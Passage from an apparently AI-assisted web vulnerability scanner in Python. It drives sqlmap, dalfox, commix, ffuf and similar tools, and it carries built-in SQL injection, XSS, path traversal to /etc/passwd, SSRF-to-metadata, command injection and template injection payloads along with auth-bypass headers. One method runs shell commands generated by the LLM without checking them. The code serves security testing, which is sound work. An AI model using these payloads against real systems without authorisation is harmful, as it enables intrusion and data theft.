    def _parse_gobuster_txt(self, out_file: str) -> list:
        """gobuster text output'dan natijalarni o'qiydi."""
        try:
            p = Path(out_file)
            if not p.exists():
                return []
            results = []
            for line in p.read_text().splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Format: /path (Status: 200) [Size: 1234]
                m_path   = re.match(r'^(/\S+)', line)
                m_status = re.search(r'Status:\s*(\d+)', line)
                m_size   = re.search(r'Size:\s*(\d+)', line)
                if m_path:
                    results.append({
                        "input":  m_path.group(1),
                        "status": int(m_status.group(1)) if m_status else 0,
                        "size":   int(m_size.group(1)) if m_size else 0,
                        "words":  0,
                        "lines":  0,
                        "url":    "",
                    })
            return results
        except Exception:
            return []




# ─────────────────────────────────────────────────────────────────────────────
# AI ENGINE
# ─────────────────────────────────────────────────────────────────────────────
FUZZER_SYSTEM_PROMPT = """You are an elite web application penetration tester AI.
You analyze HTTP traffic, tool outputs, and response diffs to find OWASP Top 10 vulnerabilities.
Always respond in strict JSON. No markdown, no text outside JSON.
Response schema:
{
  "owasp_id": "A03",
  "owasp_name": "Injection",
  "risk": "Critical|High|Medium|Low|Info",
  "confidence": 85,
  "found": true,
  "title": "SQL Injection via GET parameter id",
  "technical": "Single quote causes MySQL syntax error visible in response body",
  "exploitable": true,
  "exploit_cmd": "sqlmap -u 'http://target/page?id=1' --batch --dbs",
  "remediation": "Use parameterized queries. Never concatenate user input into SQL.",
  "evidence": "Response body contains: You have an error in your SQL syntax",
  "false_positive_reason": ""
}
"""

class AIEngine:
    def __init__(self):
        self._cache: dict[str, Any] = {}

    def _call(self, prompt: str, cache: bool = True) -> Optional[dict]:
        if not HAS_OLLAMA:
            return None
        key = hashlib.md5(prompt.encode()).hexdigest()
        if cache and key in self._cache:
            return self._cache[key]
        try:
            _client = _ollama.Client(host=OLLAMA_HOST)
            resp = _client.chat(
                model=MODEL_NAME,
                messages=[
                    {"role": "system", "content": FUZZER_SYSTEM_PROMPT},
                    {"role": "user",   "content": prompt},
                ],
            )
            raw   = resp["message"]["content"]
            clean = re.sub(r'```json|```', '', raw).strip()
            m     = re.search(r'\{.*\}', clean, re.DOTALL)
            if m:
                result = json.loads(m.group())
                if cache:
                    self._cache[key] = result
                return result
        except Exception as e:
            console.print(f"[dim red]AI error: {e}[/dim red]")
        return None

    def identify_login_fields(self, html_body: str, url: str) -> dict:
        prompt = f"""Analyze this login page HTML and identify form field names.
URL: {url}
HTML (first 3000 chars): {html_body[:3000]}
Return JSON: {{"username_field": "username", "password_field": "password",
  "csrf_field": "csrf_token", "action_url": "/login"}}"""
        result = self._call(prompt) or {}
        return {
            "username_field": result.get("username_field", "username"),
            "password_field": result.get("password_field", "password"),
            "csrf_field":     result.get("csrf_field", "csrf_token"),
            "action_url":     result.get("action_url", url),
        }

    def plan_endpoints(self, endpoints: list[Endpoint]) -> list[Endpoint]:
        if not endpoints:
            return endpoints
        summary = [
            {"url": ep.url, "method": ep.method,
             "params": list(ep.params.keys())[:8], "source": ep.discovered_by}
            for ep in endpoints[:60]
        ]
        prompt = f"""You have {len(endpoints)} discovered endpoints to test for OWASP vulnerabilities.
Sample: {json.dumps(summary, indent=2)}
Prioritize endpoints. High priority: login, admin, API, id params, file params.
Return JSON: {{"priority_urls": ["http://...", ...]}}"""
        result    = self._call(prompt) or {}
        priority  = result.get("priority_urls", [])
        if not priority:
            return endpoints
        url_map   = {ep.url: ep for ep in endpoints}
        ordered   = [url_map[u] for u in priority if u in url_map]
        remaining = [ep for ep in endpoints if ep.url not in set(priority)]
        return ordered + remaining

    def classify_finding(self, context: dict) -> Optional[dict]:
        prompt = f"""Analyze this web application test result for vulnerabilities:
TARGET URL: {context.get('url')}
METHOD: {context.get('method')}
PARAMETER: {context.get('param')}
PAYLOAD: {context.get('payload')}
TOOL: {context.get('tool')}
BASELINE: Status={context.get('baseline_status')}, Size={context.get('baseline_size')}bytes, Time={context.get('baseline_timing')}s
FUZZED: Status={context.get('fuzz_status')}, Size={context.get('fuzz_size')}bytes, Time={context.get('fuzz_timing')}s
Size diff: {context.get('size_diff')} ({context.get('size_pct')}%), Time anomaly: {context.get('time_anomaly')}
New errors: {context.get('new_errors')}
Response snippet: {context.get('body_snippet', '')[:600]}
Tool output: {context.get('tool_output', '')[:800]}
Is this a real vulnerability or false positive?"""
        return self._call(prompt, cache=False)

    def verify_finding(self, finding: "Finding", client: HTTPClient) -> dict:
        prompt = f"""Vulnerability to verify (lab only):
  URL: {finding.url}, Param: {finding.param}
  OWASP: {finding.owasp_id} - {finding.title}, Risk: {finding.risk}
  Evidence: {finding.evidence}
Write minimal non-destructive verification command.
Return JSON: {{"cmd": "curl ...", "expected": "what to look for", "safe": true}}"""
        result = self._call(prompt) or {}
        cmd = result.get("cmd", "")
        if not cmd:
            return {"confirmed": False, "reason": "No verification command"}
        r = _run_cmd(cmd, timeout=20)
        confirm_prompt = f"""Verification cmd: {cmd}
Expected: {result.get('expected','')}
Output: {r.get('output','')[:500]}
Confirmed? JSON: {{"confirmed": true/false, "evidence": "..."}}"""
        confirm = self._call(confirm_prompt, cache=False) or {}
        return {
            "confirmed": confirm.get("confirmed", False),
            "evidence":  confirm.get("evidence", ""),
            "cmd":       cmd,
            "output":    r.get("output", "")[:300],
        }

    def analyze_page(self, url: str, status: int, body: str,
                     headers: dict, is_200: dict) -> dict:
        title = re.search(r'<title[^>]*>(.*?)</title>', body, re.I|re.S)
        title = title.group(1).strip()[:80] if title else ""
        sens  = RiskScorer.score_body(body)
        prompt = f"""You are a web security analyst. Analyze this HTTP response.
URL: {url}, HTTP Status: {status}, Page Title: {title}, Content-Length: {len(body)}
Sensitive keys found: {json.dumps(sens)}
Body (first 2000 chars): {body[:2000]}
Answer ONLY in JSON:
{{
  "is_real_page": true, "is_auth_wall": false, "is_bac_candidate": false,
  "is_custom_404": false, "page_type": "login|admin|api|dashboard|config|error|static|unknown",
  "description": "What this page does",
  "sensitive_data": [], "available_actions": [], "next_tests": [],
  "suggested_child_paths": [], "risk": "Critical|High|Medium|Low|Info",
  "custom_404_reason": ""
}}"""
        return self._call(prompt, cache=False) or {
            "is_real_page": is_200.get("real", False),
            "page_type": "unknown", "description": "",
            "sensitive_data": [s["key"] for s in sens],
            "available_actions": [], "next_tests": [], "risk": "Info",
        }

    def analyze_bac(self, bac_data: dict) -> Optional[dict]:
        prompt = f"""Same endpoint requested with multiple user roles.
URL: {bac_data['url']}, Method: {bac_data['method']}
Role responses: {json.dumps(bac_data['responses'], indent=2)}
Comparison signals: {json.dumps(bac_data['comparisons'], indent=2)}
Is this BAC/IDOR?
JSON: {{"found": true, "owasp_id": "A01", "risk": "High", "confidence": 80,
        "title": "...", "technical": "...", "exploitable": true,
        "exploit_cmd": "...", "remediation": "..."}}"""
        return self._call(prompt, cache=False)

    def correlate(self, signals: list) -> list:
        if len(signals) < 2:
            return []
        prompt = f"""Multiple weak security signals:
{json.dumps(signals[:20], indent=2)}
Which form confirmed vulnerabilities?
Return JSON array: [{{"owasp_id":"A01","title":"...","risk":"High","confidence":70,"evidence":"..."}}]"""
        result = self._call(prompt, cache=False)
        if isinstance(result, list):
            return result
        if isinstance(result, dict) and "findings" in result:
            return result["findings"]
        return []

    def verify_child_access(self, parent_url: str, child_url: str,
                            child_status: int, child_body: str,
                            child_headers: dict, parent_signal: str) -> dict:
        """
        AI child URL haqiqatan BAC mi yoki login redirect mi ekanini aniqlaydi.
        Nima ko'rdi, nima qaror qildi — barchasini tushuntiradi.
        """
        title_m    = re.search(r'<title[^>]*>(.*?)</title>', child_body, re.I | re.S)
        page_title = title_m.group(1).strip()[:80] if title_m else ""
        ct_hdr     = child_headers.get("content-type", child_headers.get("Content-Type", ""))
        loc_hdr    = child_headers.get("location",     child_headers.get("Location", ""))
        server_hdr = child_headers.get("server",       child_headers.get("Server", ""))

        prompt = f"""You are a penetration tester verifying a potential Broken Access Control (BAC).

CONTEXT:
  Parent URL (was restricted): {parent_url}
  Restriction signal on parent: "{parent_signal}"
  Child URL now being tested: {child_url}
  Child HTTP status code: {child_status}

CHILD RESPONSE:
  Page title:    "{page_title}"
  Content-Type:  {ct_hdr}
  Server:        {server_hdr}
  Location hdr:  {loc_hdr}
  Body size:     {len(child_body)} bytes
  Body (first 1500 chars):
---
{child_body[:1500]}
---

DECISION RULES (apply strictly):
1. If body has login form (username+password fields) or title contains "Login/Sign in/Auth"
   → verdict=login_redirect, is_real_bac=false
2. If body size < 200 bytes with no real content
   → verdict=empty_page, is_real_bac=false
3. If body is a generic error / 404 / maintenance page
   → verdict=error_page, is_real_bac=false
4. If body contains actual protected data (user records, admin panel UI, config values,
   dashboard with real data, API keys, personal info)
   → verdict=real_bac, is_real_bac=true
5. A page that just redirects or shows the login form IS NOT a BAC,
   even if HTTP status was 200.

Respond ONLY in JSON (no markdown):
{{
  "verdict": "real_bac | login_redirect | empty_page | error_page | unknown",
  "is_real_bac": false,
  "confidence": 0,
  "what_i_see": "Plain description of what this page actually displays",
  "reason": "Why you made this decision — be specific about body content",
  "evidence": "Exact snippet from body that confirms your verdict"
}}"""

        result = self._call(prompt, cache=False)
        if result:
            return result

        # AI yo'q bo'lsa — heuristic fallback
        body_lower  = child_body.lower()
        login_words = ["login","sign in","username","password","log in",
                       "please log in","authentication required","signin"]
        login_count = sum(1 for s in login_words if s in body_lower)
        title_lower = page_title.lower()

        if login_count >= 2 or any(s in title_lower for s in ["login","sign in","auth","signin"]):
            return {
                "verdict":     "login_redirect",
                "is_real_bac": False,
                "confidence":  90,
                "what_i_see":  f"Login/auth page (title: '{page_title}')",
                "reason":      f"Body has {login_count} login signals; title='{page_title}'",
                "evidence":    f"login signals: {[s for s in login_words if s in body_lower]}",
            }
        if len(child_body) < 200:
            return {
                "verdict":     "empty_page",
                "is_real_bac": False,
                "confidence":  80,
                "what_i_see":  "Nearly empty response",
                "reason":      f"Body only {len(child_body)} bytes — no real content",
                "evidence":    child_body[:100],
            }
        return {
            "verdict":     "unknown",
            "is_real_bac": False,
            "confidence":  0,
            "what_i_see":  child_body[:200],
            "reason":      "AI unavailable — manual review needed",
            "evidence":    "",
        }


    def analyze_fuzz_baseline(self, base_url: str, probes: list) -> dict:
        """
        5 ta random probe natijasini tahlil qilib, ffuf/gobuster/wfuzz uchun
        optimal filter argumentlarini aniqlaydi.

        Savollar:
        - Barcha problar bir xil statusmi? (soft-404 pattern)
        - Sizelar bir xilmi yoki doimiy o'zgarib turadimi?
        - Word count stable'mi?
        - Title bir xilmi (branded 404)?
        - Qaysi kombinatsiya false positive'larni eng yaxshi rad qiladi?
        """
        prompt = f"""You are a penetration tester setting up smart fuzzing filters.

TARGET: {base_url}

I sent 5 random non-existent URL probes to fingerprint the 404/error behavior:
{json.dumps(probes, indent=2)}

ANALYZE these probes and determine the OPTIMAL ffuf/gobuster/wfuzz filters
to reject false positives while keeping real findings.

DECISION RULES:
1. If ALL probes have the SAME status code → add to filter_codes
2. If sizes are consistent (within 5% of each other) → add to filter_sizes
3. If word count is consistent (same value in all probes) → add to filter_words
4. If line count is consistent → add to filter_lines
5. If sizes vary significantly (>15%) → use filter_words or filter_lines instead
6. Never filter out 200 if some probes differ (might be real pages)
7. If the site returns 200 for everything with login page body:
   → filter by size AND words (login page is consistent size)
8. tolerance_bytes: how many bytes variance to accept (suggest 20-50 for stable,
   100-200 for dynamic sites)

Respond ONLY in JSON:
{{
  "filter_codes":   [],
  "filter_sizes":   [],
  "filter_words":   [],
  "filter_lines":   [],
  "tolerance_bytes": 20,
  "recursive": true,
  "explanation": "What pattern I detected and why I chose these filters",
  "site_type": "spa_with_login | traditional_404 | api | custom_404 | unknown",
  "warning": "Any important note about false positive risk"
}}"""
        result = self._call(prompt, cache=False)
        if result:
            return result

        # Fallback — BaselineEngine._heuristic_filters ishlatiladi
        return {}


    def analyze_dir_hit(self, url: str, status: int, size: int,
                        words: int, lines: int, body: str,
                        profile: "SmartFuzzProfile") -> dict:
        """
        ffuf/gobuster topgan URL'ni AI tahlil qiladi:
        - Real sahifami yoki false positive?
        - Nima turi (backup, config, admin, api, ...)?
        - Qanchalik xavfli?
        - Rekursiv fuzzing kerakmi (papkami)?
        """
        title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.I | re.S)
        title   = title_m.group(1).strip()[:60] if title_m else ""

        prompt = f"""A fuzzer found this URL. Analyze if it's a real finding.

SMART PROFILE (what 404s look like on this site):
  filter_codes={profile.filter_codes}
  filter_sizes={profile.filter_sizes}
  filter_words={profile.filter_words}
  filter_lines={profile.filter_lines}
  Profile explanation: {profile.ai_explanation[:200]}

HIT DETAILS:
  URL:    {url}
  Status: {status}
  Size:   {size} bytes
  Words:  {words}
  Lines:  {lines}
  Title:  "{title}"
  Body (first 800 chars):
{body[:800]}

DECISION:
1. Does this look like a filtered-out 404 that slipped through? → is_sensitive=false
2. Is this a real page with content? What type?
3. Does it contain sensitive data (admin panel, config, backup, DB dump, source code)?
4. Is it a DIRECTORY that should be fuzzed recursively?
5. What OWASP category fits?

Respond ONLY in JSON:
{{
  "type": "admin|config|backup|api|static|error|login|unknown",
  "is_sensitive": false,
  "is_directory": false,
  "risk": "Critical|High|Medium|Low|Info",
  "confidence": 0,
  "owasp_id": "A05",
  "owasp_name": "Security Misconfiguration",
  "title": "Short finding title",
  "reason": "Detailed explanation of what you see and why",
  "remediation": "How to fix this",
  "false_positive_reason": "If FP, why"
}}"""
        result = self._call(prompt, cache=False)
        if result:
            return result

        # Heuristic fallback
        sensitive_keywords = [
            "admin","config","backup","secret",".env","db","database",
            "debug","shell","passwd","shadow","key","token","api",
            "swagger","actuator","phpmyadmin","console","phpinfo",
        ]
        url_lower  = url.lower()
        is_sens    = any(k in url_lower for k in sensitive_keywords)
        is_dir     = not any(url_lower.endswith(e) for e in [
            ".js",".css",".png",".jpg",".ico",".woff",".map",".txt"
        ]) and not re.search(r'\.\w{1,5}$', url_lower)
        return {
            "type":          "unknown",
            "is_sensitive":  is_sens,
            "is_directory":  is_dir,
            "risk":          "Medium" if is_sens else "Info",
            "confidence":    60 if is_sens else 30,
            "owasp_id":      "A05",
            "owasp_name":    "Security Misconfiguration",
            "title":         f"Exposed path: {url}",
            "reason":        f"URL contains sensitive keyword" if is_sens else "No sensitive indicators",
            "remediation":   "Review access controls for this path.",
            "false_positive_reason": "",
        }


    def fp_filter(self, finding: "Finding") -> dict:
        prompt = f"""Is this finding a false positive?
  Title: {finding.title}, Risk: {finding.risk}, Confidence: {finding.confidence}
  Evidence: {finding.evidence}, Baseline diff: {finding.baseline_diff}
  Body snippet: {finding.response_raw[:400]}
Return JSON: {{"is_fp": false, "reason": "...", "adjusted_confidence": 75}}"""
        return self._call(prompt, cache=False) or {"is_fp": False, "reason": "", "adjusted_confidence": finding.confidence}


# ─────────────────────────────────────────────────────────────────────────────
# OWASP FUZZ ENGINE — AI wordlist tanlash bilan
# ─────────────────────────────────────────────────────────────────────────────
class OWASPFuzzEngine:
    """
    Har endpoint × parametr uchun to'g'ri Kali tool'ni tanlaydi.
    Wordlist'larni AIWordlistSelector orqali dinamik tanlaydi:
      - Sayt texnologiyasi (PHP, Java, Python, Node.js)
      - Parametr nomi va turi (file, id, url, cmd)
      - Server header'i
    Agar tizimda wordlist bo'lmasa — built-in fallback ishlatiladi.
    """

    OWASP_TOOL_MAP = {
        "A01_access_control": {
            "tools": ["ffuf_idor", "method_switch", "auth_header_test"],
            "params": ["query", "path", "header"],
        },
        "A02_crypto": {
            "tools": ["ssl_check", "header_check"],
            "params": ["header"],
        },
        "A03_sqli": {
            "tools": ["sqlmap"],
            "params": ["query", "body", "json", "hidden"],
        },
        "A03_xss": {
            "tools": ["dalfox"],
            "params": ["query", "body", "json", "hidden"],
        },
        "A03_cmdi": {
            "tools": ["commix"],
            "params": ["query", "body"],
        },
        "A03_lfi": {
            "tools": ["ffuf_lfi"],
            "params": ["query", "body", "path"],
        },
        "A03_ssti": {
            "tools": ["wfuzz_ssti"],
            "params": ["query", "body"],
        },
        "A04_rate_limit": {
            "tools": ["rate_check"],
            "params": ["query", "body"],
        },
        "A05_misconfig": {
            "tools": ["nikto", "header_check"],
            "params": [],
        },
        "A07_auth": {
            "tools": ["hydra_probe", "jwt_check"],
            "params": ["header", "cookie"],
        },
        "A10_ssrf": {
            "tools": ["ffuf_ssrf"],
            "params": ["query", "body", "json"],
        },
    }

    # Built-in fallback payloadlar — FAQAT tizimda wordlist topilmaganda ishlatiladi
    SQLI_QUICK = [
        "'", "''", "1'--", "1 OR 1=1--", "admin'--",
        "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--",
    ]
    XSS_QUICK = [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "{{7*7}}", "${7*7}",
    ]
    LFI_QUICK = [
        "../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "/etc/passwd", "....//....//etc/passwd",
    ]
    SSRF_QUICK = [
        "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/", "file:///etc/passwd",
    ]
    CMDI_QUICK = [
        "; id", "| id", "` id`", "$(id)",
        "; sleep 3", "| sleep 3",
    ]
    SSTI_QUICK = [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{config}}", "{% debug %}",
    ]

    def __init__(self, client: HTTPClient, baseline: BaselineEngine,
                 kali: KaliToolRunner, ai: AIEngine,
                 wl_selector: "AIWordlistSelector",
                 site_tech: dict = None):
        self.client      = client
        self.baseline    = baseline
        self.kali        = kali
        self.ai          = ai
        self.wl_selector = wl_selector
        self.site_tech   = site_tech or {}
        self.findings    : list[Finding] = []
        self.signals     : list[dict]    = []
        self._lock       = threading.Lock()

    def _build_wl_context(self, ep: Endpoint, param_key: str, category: str) -> dict:
        """
        Wordlist tanlash uchun kontekst to'plash.
        URL, parametr nomi, texnologiya, server — barchasi kiritiladi.
        """
        param_name = param_key.split(":")[-1].lower()

        # Parametr turini heuristic aniqlash
        param_type = "generic"
        if any(k in param_name for k in ["file","path","dir","include","load","read","open"]):
            param_type = "file"
        elif any(k in param_name for k in ["url","redirect","next","return","dest","host","src"]):
            param_type = "url"
        elif any(k in param_name for k in ["cmd","exec","command","run","shell","system","ping"]):
            param_type = "cmd"
        elif any(k in param_name for k in ["id","user_id","uid","pid","oid","record"]):
            param_type = "id"
        elif any(k in param_name for k in ["query","search","q","keyword","find","filter"]):
            param_type = "search"
        elif any(k in param_name for k in ["template","tpl","view","layout","theme"]):
            param_type = "template"

        return {
            "url":         ep.url,
            "param":       param_key,
            "tech":        self.site_tech.get("lang", "unknown"),
            "framework":   self.site_tech.get("framework", "unknown"),
            "server":      self.site_tech.get("server", "unknown"),
            "cms":         self.site_tech.get("cms", "unknown"),
            "param_type":  param_type,
            "param_name":  param_name,
            "page_title":  "",
            "category":    category,
        }

    def test_endpoint(self, ep: Endpoint) -> list[Finding]:
        base_fp  = self.baseline.get(ep)
        results  = []
        for check_id, cfg in self.OWASP_TOOL_MAP.items():
            relevant_params = self._get_relevant_params(ep, cfg["params"])
            for param_key in relevant_params[:8]:
                param_name = param_key.split(":")[-1]
                for tool_name in cfg["tools"]:
                    finding = self._run_tool(check_id, tool_name, ep, param_key, param_name, base_fp)
                    if finding:
                        results.append(finding)
        return results

    def _run_tool(self, check_id: str, tool_name: str,
                  ep: Endpoint, param_key: str, param_name: str,
                  base_fp: BaselineFingerprint) -> Optional[Finding]:

        tool_out = {"tool": tool_name, "output": "", "available": True}

        if tool_name == "sqlmap" and check_id == "A03_sqli":
            data = urllib.parse.urlencode(ep.params) if ep.method == "POST" else ""
            tool_out = self.kali.sqlmap(ep.url, param_key, ep.method, data)

        elif tool_name == "dalfox" and check_id == "A03_xss":
            data = urllib.parse.urlencode(ep.params) if ep.method == "POST" else ""
            tool_out = self.kali.dalfox(ep.url, param_key, data, ep.method)

        elif tool_name == "commix" and check_id == "A03_cmdi":
            data = urllib.parse.urlencode(ep.params) if ep.method == "POST" else ""
            tool_out = self.kali.commix(ep.url, param_key, data, ep.method)

        elif tool_name == "ffuf_lfi":
            # AI sayt texnologiyasiga qarab LFI wordlist'ni tanlaydi
            ctx = self._build_wl_context(ep, param_key, "lfi")
            wl  = self.wl_selector.select("lfi", ctx)
            fuzz_url = self._inject_fuzz(ep.url, param_key, "FUZZ")
            tool_out = self.kali.ffuf(fuzz_url, wl)

        elif tool_name == "ffuf_ssrf":
            # AI URL parametriga qarab SSRF wordlist'ni tanlaydi
            ctx = self._build_wl_context(ep, param_key, "ssrf")
            wl  = self.wl_selector.select("ssrf", ctx)
            fuzz_url = self._inject_fuzz(ep.url, param_key, "FUZZ")
            tool_out = self.kali.ffuf(fuzz_url, wl)

        elif tool_name == "ffuf_idor":
            return self._idor_probe(ep, param_key, base_fp)

        elif tool_name == "method_switch":
            return self._method_switch_probe(ep, base_fp)

        elif tool_name == "auth_header_test":
            return self._auth_header_probe(ep, param_key, base_fp)

        elif tool_name == "nikto":
            tool_out = self.kali.nikto(ep.url)

        elif tool_name == "header_check":
            return self._header_security_check(ep, base_fp)

        elif tool_name == "rate_check":
            return self._rate_limit_check(ep)

        elif tool_name == "jwt_check":
            return self._jwt_analysis(ep)

        elif tool_name == "ssl_check":
            return self._ssl_check(ep)

        elif tool_name == "wfuzz_ssti":
            # AI template engine turini sayt ko'rinishidan aniqlaydi
            ctx = self._build_wl_context(ep, param_key, "ssti")
            wl  = self.wl_selector.select("ssti", ctx)
            data = urllib.parse.urlencode({param_name: "FUZZ"}) if ep.method == "POST" else ""
            tool_out = self.kali.wfuzz(
                self._inject_fuzz(ep.url, param_key, "FUZZ"),
                data, wl
            )

        else:
            return None

        if not tool_out.get("available", True):
            return None

        # Quick payload'lar bilan direct fuzz
        payloads    = self._get_quick_payloads(check_id)
        best_resp   = None
        best_diff   = {}
        best_payload = ""
        for payload in payloads[:5]:
            fuzz_resp = self._fuzz_request(ep, param_key, param_name, payload)
            diff      = self.baseline.diff(base_fp, fuzz_resp, fuzz_resp.get("timing", 0))
            if self._diff_is_interesting(diff):
                best_resp    = fuzz_resp
                best_diff    = diff
                best_payload = payload
                break

        if best_resp is None and not tool_out.get("output"):
            return None

        resp_for_ai = best_resp or {}
        context = {
            "url":             ep.url,
            "method":          ep.method,
            "param":           param_key,
            "payload":         best_payload,
            "tool":            tool_name,
            "baseline_status": base_fp.status,
            "baseline_size":   base_fp.body_len,
            "baseline_timing": base_fp.timing_avg,
            "baseline_title":  base_fp.title,
            "fuzz_status":     resp_for_ai.get("status", 0),
            "fuzz_size":       len(resp_for_ai.get("body", "")),
            "fuzz_timing":     resp_for_ai.get("timing", 0),
            "size_diff":       best_diff.get("size_diff", 0),
            "size_pct":        best_diff.get("size_pct", 0),
            "time_anomaly":    best_diff.get("time_anomaly", False),
            "new_errors":      best_diff.get("new_errors", []),
            "status_changed":  best_diff.get("status_changed", False),
            "body_snippet":    resp_for_ai.get("body", "")[:500],
            "tool_output":     tool_out.get("output", "")[:800],
        }

        ai_result = self.ai.classify_finding(context)
        if not ai_result or not ai_result.get("found"):
            if ai_result and ai_result.get("confidence", 0) > 20:
                self.signals.append({**context, "ai": ai_result})
            return None

        confidence = ai_result.get("confidence", 50)
        if confidence < MIN_CONFIDENCE:
            return None

        if best_diff:
            diff_str = json.dumps(best_diff, default=str)[:300]
        elif tool_out.get("output"):
            diff_str = json.dumps({
                "tool_only_signal": tool_name,
                "fuzz_status": resp_for_ai.get("status", 0),
                "fuzz_size": len(resp_for_ai.get("body", "")),
            }, default=str)[:300]
        else:
            diff_str = ""
        f = Finding(
            owasp_id     = ai_result.get("owasp_id", check_id[:3].upper()),
            owasp_name   = ai_result.get("owasp_name", check_id),
            title        = ai_result.get("title", ""),
            risk         = ai_result.get("risk", "Medium"),
            confidence   = confidence,
            url          = ep.url,
            method       = ep.method,
            param        = param_key,
            payload      = best_payload,
            evidence     = ai_result.get("evidence", "") or tool_out.get("output", "")[:220],
            baseline_diff= diff_str,
            tool_output  = tool_out.get("output", "")[:500],
            request_raw  = self._build_request_str(ep, param_key, best_payload),
            response_raw = (resp_for_ai.get("body", "")[:600] if resp_for_ai else ""),
            exploit_cmd  = ai_result.get("exploit_cmd", ""),
            remediation  = ai_result.get("remediation", ""),
        )
        with self._lock:
            self.findings.append(f)
        self._print_finding(f)
        return f

    # ── Specialized probes (o'zgarmagan) ────────────────────────────────────
    def _idor_probe(self, ep: Endpoint, param_key: str,
                    base_fp: BaselineFingerprint) -> Optional[Finding]:
        pname  = param_key.split(":")[-1]
        orig   = ep.params.get(param_key, "1")
        if not str(orig).isdigit():
            return None
        for delta in [1, -1, 2, 999, 0]:
            test_val  = str(int(orig) + delta) if delta != 999 else "999999"
            resp = self.client.get(self._rebuild_url(ep.url, pname, test_val))
            diff = self.baseline.diff(base_fp, resp, resp.get("timing", 0))
            if diff.get("status_changed") or diff.get("size_pct", 0) > 15:
                context = {
                    "url": ep.url, "method": "GET", "param": param_key,
                    "payload": f"id={test_val} (IDOR attempt)", "tool": "idor_probe",
                    "baseline_status": base_fp.status, "baseline_size": base_fp.body_len,
                    "baseline_timing": base_fp.timing_avg, "baseline_title": base_fp.title,
                    "fuzz_status": resp.get("status"), "fuzz_size": len(resp.get("body","")),
                    "fuzz_timing": resp.get("timing", 0), "size_diff": diff["size_diff"],
                    "size_pct": diff["size_pct"], "time_anomaly": False,
                    "new_errors": diff.get("new_errors", []), "status_changed": diff["status_changed"],
                    "body_snippet": resp.get("body","")[:500],
                    "tool_output": f"ID {orig} vs {test_val}: size diff {diff['size_diff']}",
                }
                ai_r = self.ai.classify_finding(context)
                if ai_r and ai_r.get("found") and ai_r.get("confidence", 0) >= MIN_CONFIDENCE:
                    return Finding(
                        owasp_id="A01", owasp_name="Broken Access Control",
                        title=ai_r.get("title","Possible IDOR"),
                        risk=ai_r.get("risk","Medium"), confidence=ai_r.get("confidence",50),
                        url=ep.url, method="GET", param=param_key,
                        payload=test_val, evidence=ai_r.get("evidence",""),
                        baseline_diff=json.dumps(diff)[:200], tool_output="",
                        request_raw=f"GET {ep.url}?{pname}={test_val}",
                        response_raw=resp.get("body","")[:400],
                        exploit_cmd=ai_r.get("exploit_cmd",""),
                        remediation=ai_r.get("remediation",""),
                    )
        return None

    def _method_switch_probe(self, ep: Endpoint,
                             base_fp: BaselineFingerprint) -> Optional[Finding]:
        for method in ["PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]:
            r = self.client._request(ep.url, method)
            if r["status"] not in (405, 501, 0) and r["status"] != base_fp.status:
                return Finding(
                    owasp_id="A01", owasp_name="Broken Access Control",
                    title=f"HTTP Method {method} accepted unexpectedly",
                    risk="Medium", confidence=55,
                    url=ep.url, method=method, param="HTTP_METHOD",
                    payload=method, evidence=f"Status {r['status']} for {method}",
                    baseline_diff=f"Baseline: {base_fp.status}, {method}: {r['status']}",
                    tool_output="", request_raw=f"{method} {ep.url}",
                    response_raw=r.get("body","")[:300],
                    exploit_cmd=f"curl -X {method} '{ep.url}'",
                    remediation="Restrict allowed HTTP methods.",
                )
        return None

    def _auth_header_probe(self, ep: Endpoint, param_key: str,
                           base_fp: BaselineFingerprint) -> Optional[Finding]:
        bypass_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP":       "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Original-URL":  "/admin",
            "X-Rewrite-URL":   "/admin",
        }
        for h, v in bypass_headers.items():
            r    = self.client.get(ep.url, extra_headers={h: v})
            diff = self.baseline.diff(base_fp, r, r.get("timing", 0))
            if diff.get("status_changed") and r["status"] == 200 and base_fp.status in (401, 403):
                return Finding(
                    owasp_id="A01", owasp_name="Broken Access Control",
                    title=f"Access Control Bypass via {h} header",
                    risk="High", confidence=75,
                    url=ep.url, method="GET", param=f"header:{h}",
                    payload=v, evidence=f"With {h}: {v}, status {base_fp.status}→200",
                    baseline_diff=diff.get("status_diff",""), tool_output="",
                    request_raw=f"GET {ep.url}\n{h}: {v}",
                    response_raw=r.get("body","")[:300],
                    exploit_cmd=f"curl -H '{h}: {v}' '{ep.url}'",
                    remediation=f"Do not use {h} for access control.",
                )
        return None

    def _header_security_check(self, ep: Endpoint,
                               base_fp: BaselineFingerprint) -> Optional[Finding]:
        r = self.client.get(ep.url)
        missing = []
        required = {
            "strict-transport-security": ("Medium", "HSTS missing"),
            "content-security-policy":   ("High",   "No CSP"),
            "x-frame-options":           ("Medium", "Clickjacking possible"),
            "x-content-type-options":    ("Low",    "MIME sniffing possible"),
            "referrer-policy":           ("Low",    "Referrer leakage"),
        }
        hdrs_lower = {k.lower(): v for k, v in r.get("headers", {}).items()}
        for h, (risk, desc) in required.items():
            if h not in hdrs_lower:
                missing.append({"header": h, "risk": risk, "desc": desc})
        cors = hdrs_lower.get("access-control-allow-origin", "")
        if cors == "*":
            missing.append({"header": "CORS wildcard", "risk": "High", "desc": "Wildcard CORS"})
        if not missing:
            return None
        worst_risk = "High" if any(m["risk"]=="High" for m in missing) else "Medium"
        return Finding(
            owasp_id="A05", owasp_name="Security Misconfiguration",
            title=f"Missing security headers ({len(missing)} issues)",
            risk=worst_risk, confidence=90,
            url=ep.url, method="GET", param="HTTP_HEADERS", payload="",
            evidence="; ".join(f"{m['header']}: {m['desc']}" for m in missing[:3]),
            baseline_diff="", tool_output="",
            request_raw=f"GET {ep.url}",
            response_raw="\n".join(f"{k}: {v}" for k,v in list(r.get("headers",{}).items())[:15]),
            exploit_cmd="",
            remediation="Add missing security headers to all responses.",
        )

    def _rate_limit_check(self, ep: Endpoint) -> Optional[Finding]:
        if not any(k in ep.url.lower() for k in ["/login", "/auth", "/signup", "/reset"]):
            return None
        statuses = []
